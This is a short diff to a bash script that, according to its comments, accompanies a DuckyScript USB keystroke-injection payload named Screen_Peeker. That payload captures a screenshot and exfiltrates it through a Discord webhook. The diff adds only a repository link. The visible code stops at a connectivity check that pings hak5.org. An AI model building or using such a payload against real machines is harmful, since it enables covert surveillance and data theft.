@@ -1,5 +1,7 @@
 # Screen_Peeker Bash script to accompany Screen_Peeker DuckyScript payload.txt
 # Checks to see if internet connectivity is present, captures screenshot, and exfiltrates via Discord webhook.
+# https://github.com/OSINTI4L/DuckyScript-Payloads
+
 #!/bin/bash
 net_check() {
 	ping -c 1 hak5.org
